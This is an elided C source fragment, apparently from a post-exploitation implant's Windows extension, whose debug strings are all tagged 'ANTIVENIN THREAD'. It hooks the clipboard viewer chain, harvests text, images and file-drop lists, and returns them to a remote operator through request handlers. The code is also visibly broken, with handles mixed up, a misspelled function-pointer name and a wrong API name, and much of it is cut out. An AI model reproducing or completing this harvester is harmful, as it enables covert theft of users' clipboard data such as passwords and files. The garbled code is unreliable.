...
/*! @brief Flag indicating initialization status of the thread state. */
static BOOL gThreadInitialized = FALSE;
...
/*! @brief NtQueryInformationThread function pointer type. */
typedef DWORD(WINAPI * PNTQUERYINFORMATIONTHREAD)(HANDLE hThread, DWORD dwThreadInfoClass, PVOID ThreadInformation, ULONG ThreadInfoLength, PULONG ReturnLength);

static PNTQUERYINFORMATIONTHREAD pNtQueryInformationThreaad = NULL;
...
DWORD initialize_threads()
{
	...
	do
	{
		dprintf("[ANTIVENIN THREAD] Loading ntdll.dll");
		if ((hKernel32 = LoadLibraryA("ntdll.dll")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to load ntdll.dll");
		}

		dprintf("[ANTIVENIN THREAD] Loading kernel32.dll");
		if ((hKernel32 = LoadLibraryA("kernel32.dll")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to load kernel32.dll");
		}

		dprintf("[ANTIVENIN THREAD] Loading dbghelp.dll");
		if ((hDbghelp = LoadLibraryA("dbghelp.dll")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to load dbghelp.dll");
		}

		if ((hPsapi = LoadLibraryA("psapi.dll")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to load psapi.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for NtQueryInformationThread");
		if ((pNtQueryInformationThread = (PNTQUERYINFORMATIONTHREAD)GetProcAddress(hNtdll, "NtQueryInformationThread")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate NtQueryInformationThread in ntdll.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for GetNativeSystemInfo");
		if ((pGetNativeSystemInfo = (PGETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate GetNativeSystemInfo in kernel32.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for IsWow64Process");
		if ((pIsWow64Process = (PISWOW64PROCESS)GetProcAddress(hKernel32, "IsWow64Process")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate IsWow64Process in kernel32.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for OpenProcess");
		if ((pOpenProcess = (POPENPROCESS)GetProcAddress(hKernel32, "OpenProcess")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate OpenProcess in kernel32.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for OpenThread");
		if ((pOpenThread = (POPENTHREAD)GetProcAddress(hKernel32, "OpenThread")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate OpenThread in kernel32.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for GetThreadTimes");
		if ((pGetThreadTimes = (PGETTHREADTIMES)GetProcAddress(hKernel32, "GetThreadTimes")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate GetThreadTimes in kernel32.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for SuspendThread");
		if ((pSuspendThread = (PSUSPENDTHREAD)GetProcAddress(hKernel32, "SuspendThread")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate SuspendThread in kernel32.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for Wow64SuspendThread");
		if ((pWow64SuspendThread = (PWOW64SUSPENDTHREAD)GetProcAddress(hKernel32, "WowSuspendThread")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate Wow64SuspendThread in kernel32.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for GetThreadContext");
		if ((pGetThreadContext = (PGETTHREADCONTEXT)GetProcAddress(hKernel32, "GetThreadContext")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate GetThreadContext in kernel32.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for Wow64GetThreadContext");
		if ((pWow64GetThreadContext = (PWOW64GETTHREADCONTEXT)GetProcAddress(hKernel32, "Wow64GetThreadContext")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate Wow64GetThreadContext in kernel32.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for ResumeThread");
		if ((pResumeThread = (PRESUMETHREAD)GetProcAddress(hKernel32, "ResumeThread")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate ResumeThread in kernel32.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for CloseHandle");
		if ((pCloseHandle = (PCLOSEHANDLE)GetProcAddress(hKernel32, "CloseHandle")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate CloseHandle in kernel32.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for SymInitialize");
		if ((pSymInitialize = (PSYMINITIALIZE)GetProcAddress(hDbghelp, "SymInitialize")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate SymInitialize in dbghelp.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for SymCleanup");
		if ((pSymCleanup = (PSYMCLEANUP)GetProcAddress(hDbghelp, "SymCleanup")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate SymCleanup in dbghelp.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for SymFunctionTableAccess64");
		if ((pSymFunctionTableAccess64 = (PSYMFUNCTIONTABLEACCESS64)GetProcAddress(hDbghelp, "SymFunctionTableAccess64")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate SymFunctionTableAccess64 in dbghelp.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for SymGetModuleBase64");
		if ((pSymGetModuleBase64 = (PSYMGETMODULEBASE64)GetProcAddress(hDbghelp, "SymGetModuleBase64")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate SymGetModuleBase64 in dbghelp.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for SymLoadModuleEx");
		if ((pSymLoadModuleEx = (PSYMLOADMODULEEX)GetProcAddress(hDbghelp, "SymLoadModuleEx")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate SymLoadModuleEx in dbghelp.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for SymGetSymFromAddr64");
		if ((pSymGetSymFromAddr64 = (PSYMGETSYMFROMADDR64)GetProcAddress(hDbghelp, "SymGetSymFromAddr64")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate SymGetSymFromAddr64 in dbghelp.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for StackWalk64");
		if ((pStackWalk64 = (PSTACKWALK64)GetProcAddress(hDbghelp, "StackWalk64")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate StackWalk64 in dbghelp.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for EnumProcessModulesEx");
		if ((pEnumProcessModulesEx = (PENUMPROCESSMODULESEX)GetProcAddress(hPsapi, "EnumProcessModulesEx")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate EnumProcessModulesEx in psapi.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for GetModuleBaseNameA");
		if ((pGetModuleBaseNameA = (PGETMODULEBASENAMEA)GetProcAddress(hPsapi, "GetModuleBaseNameA")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate GetModuleBaseNameA in psapi.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for GetModuleFileNameExA");
		if ((pGetModuleFileNameExA = (PGETMODULEFILENAMEEXA)GetProcAddress(hPsapi, "GetModuleFileNameExA")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate GetModuleFileNameExA in psapi.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for GetModuleInformation");
		if ((pGetModuleInformation = (PGETMODULEINFORMATION)GetProcAddress(hPsapi, "GetModuleInformation")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate GetModuleInformation in psapi.dll");
		}

		dprintf("[ANTIVENIN THREAD] Searching for GlobalFree");
		if ((pGlobalFree = (PGLOBALFREE)GetProcAddress(hKernel32, "GlobalFree")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Unable to locate GlobalFree in kernel32.dll");
		}
...
{
	dprintf("[ANTIVENIN THREAD] parsing timestamp %p", pTime);
	...
	dprintf("[ANTIVENIN THREAD] timestamp parsed");
}
...
VOID dump_clipboard_capture(Packet* pResponse, ClipboardCapture* pCapture, BOOL bCaptureImageData)
{
	...
	dprintf("[ANTIVENIN THREAD] Dumping clipboard capture");
	...
	dprintf("[ANTIVENIN THREAD] Timestamp added: %s", timestamp);

	switch (pCapture->captureType)
	{
	case CapText:
		dprintf("[ANTIVENIN THREAD] Dumping text %s", pCapture->lpText);
		...
		break;
	case CapImage:
		dprintf("[ANTIVENIN THREAD] Dumping image %ux%x", pCapture->lpImage->dwWidth, pCapture->lpImage->dwHeight);
...
DWORD capture_clipboard(BOOL bCaptureImageData, ClipboardCapture** ppCapture)
{
	...
	pCapture->pNext = NULL;
	dprintf("[ANTIVENIN THREAD] Getting timestamp");
	...
	do
	{
		...
		if (!pOpenClipboard(NULL))
		{
			...
			BREAK_WITH_ERROR("[ANTIVENIN THREAD] Unable to open the clipboard", dwResult);
		}

		dprintf("[ANTIVENIN THREAD] Clipboard locked, attempting to get data...");
		...
		while (uFormat = pEnumClipboardFormats(uFormat))
		{
			if (uFormat == CF_TEXT)
			{
				...
				{
					dprintf("[ANTIVENIN THREAD] Clipboard text captured: %s", lpClipString);
			...
			{
				dprintf("[ANTIVENIN THREAD] Grabbing the clipboard bitmap data");
				...
				{
					dprintf("[ANTIVENIN THREAD] CF_DIB grabbed, extracting dimensions.");
					...
					dprintf("[ANTIVENIN THREAD] Image is %dx%d and %s be downloaded", lpBI->bmiHeader.biWidth, lpBI->bmiHeader.biHeight,
					...
					if (bCaptureImageData)
					{
						...
						{
							dprintf("[ANTIVENIN THREAD] Clipboard bitmap captured to image: %p, Size: %u bytes", image.pImageBuffer, image.dwImageBufferSize);
						...
						{
							dwResult = GetLastError();
							dprintf("[ANTIVENIN THREAD] Failed to convert clipboard image to JPG");
						}
					}
				...
				{
					dwResult = GetLastError();
					dprintf("[ANTIVENIN THREAD] Failed to get access to the CF_DIB information");
				}
			}
			else if (uFormat == CF_HDROP)
			{
				// there's one or more files on the clipboard
				dprintf("[ANTIVENIN THREAD] Files have been located on the clipboard");
				dprintf("[ANTIVENIN THREAD] Grabbing the clipboard file drop data");
					...
					&& (hFileDrop = (HDROP)pGlobalLock(hClipboardData)) != NULL)
				{
					...
					dprintf("[ANTIVENIN THREAD] Parsing %u file(s) on the clipboard.", uFileCount);
					...
					for (uFileIndex = 0; uFileIndex < uFileCount; ++uFileIndex)
					{
						if (pFile == NULL)
						{
							dprintf("[ANTIVENIN THREAD] First file");
							pCapture->lpFiles = pFile = (ClipboardFile*)malloc(sizeof(ClipboardFile));
						}
						else
						{
							dprintf("[ANTIVENIN THREAD] Extra file");
						...
						dprintf("[ANTIVENIN THREAD] Attempting to get file data");
						if (pDragQueryFileA(hFileDrop, uFileIndex, lpFileName, sizeof(lpFileName)))
						{
							dprintf("[ANTIVENIN THREAD] Clipboard file entry: %s", lpFileName);
		...
		dwResult = GetLastError();
		dprintf("[ANTIVENIN THREAD] Finished with result %u (%x)", dwResult, dwResult);
...
LRESULT WINAPI clipboard_monitor_window_proc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	...
	case WM_CREATE:
		dprintf("[ANTIVENIN THREAD] received WM_CREATE %x (lParam = %p wParam = %p)", hWnd, lParam, wParam);
		...
		dprintf("[ANTIVENIN THREAD] SetClipboardViewer called, next viewer is %x", pState->hNextViewer);

		if (!pState->hNextViewer)
		{
			dprintf("[ANTIVENIN THREAD] SetClipboardViewer error %u", GetLastError());
		}

		return 0;

	case WM_CHANGECBCHAIN: 
		dprintf("[ANTIVENIN THREAD] received WM_CHANGECBCHAIN %x", hWnd);
		...
		if ((HWND)wParam == pState->hNextViewer)
		{
			...
			dprintf("[ANTIVENIN THREAD] Next viewer is now %x", pState->hNextViewer);
		}
     ...
     case WM_DRAWCLIPBOARD:
		dprintf("[ANTIVENIN THREAD] received WM_DRAWCLIPBOARD %x", hWnd);
		pState = (ClipboardState*)GetWindowLongPtrA(hWnd, GWLP_USERDATA);

		if (pState->bRunning)
		{
			dprintf("[ANTIVENIN THREAD] thread is running, harvesting clipboard %x", hWnd);
			...
			if (dwResult == ERROR_SUCCESS && pNewCapture != NULL)
			{
				...
				{
					dprintf("[ANTIVENIN THREAD] Capture added %x", hWnd);
				}
				else
				{
					free(pNewCapture);
					dprintf("[ANTIVENIN THREAD] Ignoring duplicate capture", hWnd);
				}
			}
			else
			{
				dprintf("[ANTIVENIN THREAD] Failed to harvest from clipboard %x: %u (%x)", hWnd, dwResult, dwResult);
			}
		}
		else
		{
			dprintf("[ANTIVENIN THREAD] thread is no running, ignoring clipboard change %x", hWnd);
		}

		if (pState->hNextViewer)
		{
			dprintf("[ANTIVENIN THREAD] Passing on to %x", pState->hNextViewer);
			SendMessageA(pState->hNextViewer, uMsg, wParam, lParam);
		}
	...
	case WM_DESTROY:
		dprintf("[ANTIVENIN THREAD] received WM_DESTROY %x", hWnd);
		pState = (ClipboardState*)GetWindowLongPtrA(hWnd, GWLP_USERDATA);
	...
	default:
		dprintf("[ANTIVENIN THREAD] received %x for window %x", uMsg);
...
DWORD create_clipboard_monitor_window(ClipboardState* pState)
{
	...
	dprintf("[ANTIVENIN THREAD] Setting up the monitor window. Class = %s from %p -> %s", wndClass.lpszClassName, pState, pState->cbWindowClass);

	do
	{
		if (!RegisterClassExA(&wndClass))
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Failed to register window class.");
		}

		dprintf("[ANTIVENIN THREAD] Window registered");
		bRegistered = TRUE;
		...
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Failed to create message only window instance");
		}

		dprintf("[ANTIVENIN THREAD] Window created");
		dwResult = ERROR_SUCCESS;
	...
	{
		dprintf("[ANTIVENIN THREAD] Unregistering window class due to failure");
...
DWORD destroy_clipboard_monitor_window(ClipboardState* pState)
{
	...
	do
	{
		dprintf("[ANTIVENIN THREAD] Destroying clipboard monitor window: %p", pState);
		if (!DestroyWindow(pState->hClipboardWindow))
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Failed to destroy the clipboard window");
		}

		if (!UnregisterClassA(pState->cbWindowClass, GetModuleHandleA(NULL)))
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Failed to remove the clipboard window class");
		}
...
DWORD request_clipboard_get_data(Remote *remote, Packet *packet)
{
	...
	do
	{
		dprintf("[ANTIVENIN THREAD] Checking to see if we loaded OK");
		if (!gClipboardInitialised)
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] Clipboard failed to initialise, unable to get data");
		}
		...
		{
			BREAK_ON_ERROR("[ANTIVENIN THREAD] failed to read clipboard data");
		}

		dprintf("[ANTIVENIN THREAD] writing to socket");
		dump_clipboard_capture(pResponse, pCapture, bDownload);
		dprintf("[ANTIVENIN THREAD] written to socket");
	...
	if (pResponse)
	{
		dprintf("[ANTIVENIN THREAD] sending response");
...
DWORD request_clipboard_set_data(Remote *remote, Packet *packet)
{
	...
	do
	{
		...
		{
			BREAK_WITH_ERROR("[ANTIVENIN THREAD] No string data specified", ERROR_INVALID_PARAMETER);
		}
		...
		if ((hClipboardData = pGlobalAlloc(GMEM_MOVEABLE | GMEM_DDESHARE, cbStringBytes)) == NULL)
		{
			dwResult = GetLastError();
			pCloseClipboard();
			BREAK_WITH_ERROR("[ANTIVENIN THREAD] Failed to allocate clipboard memory", dwResult);
		}
		...
		{
			dwResult = GetLastError();
			dprintf("[ANTIVENIN THREAD] Failed to set the clipboad data: %u", dwResult);
		}
		else
		{
			dwResult = ERROR_SUCCESS;
...
DWORD THREADCALL clipboard_monitor_thread_func(THREAD * thread)
{
	...
	do
	{
		if (pState == NULL)
		{
			BREAK_WITH_ERROR("[ANTIVENIN THREAD] Thread state is NULL", ERROR_INVALID_PARAMETER);
		}
		...
		dprintf("[ANTIVENIN THREAD] Thread started");
		...
		dprintf("[ANTIVENIN THREAD] thread wait handle : %x", waitableHandles[0]);
		dprintf("[ANTIVENIN THREAD] pause wait handle  : %x", waitableHandles[1]);
		dprintf("[ANTIVENIN THREAD] resume wait handle : %x", waitableHandles[2]);
		...
		while (!bTerminate)
		{
			...
			case 0: // stop the thread
				dprintf("[ANTIVENIN THREAD] Thread stopping");
				bTerminate = TRUE;
				break;
			case 1: // pause the thread
				dprintf("[ANTIVENIN THREAD] Thread paused");
				pState->bRunning = FALSE;
				// indicate that we've paused
				event_signal(pState->hResponseEvent);
				break;
			case 2: // resume the thread
				dprintf("[ANTIVENIN THREAD] Thread resumed");
				pState->bRunning = TRUE;
			...
			default:
				...
				{
					dprintf("[ANTIVENIN THREAD] Pumping message");
		...
		event_signal(pState->hResponseEvent);
		dprintf("[ANTIVENIN THREAD] Thread stopped");
...
{
	dprintf("[ANTIVENIN THREAD] Destroying clipboard monitor state");
...
DWORD request_clipboard_monitor_start(Remote *remote, Packet *packet)
{
	...
	do
	{
		...
		{
			BREAK_WITH_ERROR("[ANTIVENIN THREAD] Monitor thread already running", ERROR_ALREADY_INITIALIZED);
		}

		dprintf("[ANTIVENIN THREAD] Starting clipboard monitor");

		pState = (ClipboardState*)malloc(sizeof(ClipboardState));
		if (pState == NULL)
		{
			BREAK_WITH_ERROR("[ANTIVENIN THREAD] Unable to allocate memory for clipboard state", ERROR_NOT_ENOUGH_MEMORY);
		}

		dprintf("[ANTIVENIN THREAD] pState %p", pState);
		...
		{
			BREAK_WITH_ERROR("[ANTIVENIN THREAD] Window class name is missing", ERROR_INVALID_PARAMETER);
		}

		strncpy_s(pState->cbWindowClass, sizeof(pState->cbWindowClass), lpClassName, sizeof(pState->cbWindowClass) - 1);
		dprintf("[ANTIVENIN THREAD] Class Name set to %s", pState->cbWindowClass);
		...
		{
			BREAK_WITH_ERROR("[ANTIVENIN THREAD] Unable to allocate memory for clipboard events", ERROR_NOT_ENOUGH_MEMORY);
		}
		...
		if (pState->hThread == NULL)
		{
			BREAK_WITH_ERROR("[ANTIVENIN THREAD] Unable to allocate memory for clipboard thread", ERROR_NOT_ENOUGH_MEMORY);
		}
		...
		{
			BREAK_WITH_ERROR("[ANTIVENIN THREAD] Thread failed to start correctly", ERROR_ABANDONED_WAIT_0);
		}
...
DWORD request_clipboard_monitor_pause(Remote *remote, Packet *packet)
{
	...
	do
	{
		if (gClipboardState == NULL)
		{
			BREAK_WITH_ERROR("[ANTIVENIN THREAD] Monitor thread isn't running", ERROR_NOT_CAPABLE);
		}

		dprintf("[ANTIVENIN THREAD] Pausing clipboard monitor");
...
DWORD request_clipboard_monitor_resume(Remote *remote, Packet *packet)
{
	...
	do
	{
		...
		dprintf("[ANTIVENIN THREAD] Resuming clipboard monitor");
...
DWORD request_clipboard_monitor_stop(Remote *remote, Packet *packet)
{
	...
	do
	{
		if (gClipboardState == NULL)
		{
			BREAK_WITH_ERROR("[ANTIVENIN THREAD] Monitor thread isn't running", ERROR_NOTHING_TO_TERMINATE);
		}

		dprintf("[ANTIVENIN THREAD] Stopping clipboard monitor");
		...
		{
			// ... FINISH HIM!
			dprintf("[ANTIVENIN THREAD] Brutally terminating the thread for not responding fast enough");
...
DWORD request_clipboard_monitor_dump(Remote *remote, Packet *packet)
{
	...
	do
	{
		...
		dprintf("[ANTIVENIN THREAD] Purging? %s", bPurge ? "TRUE" : "FALSE");
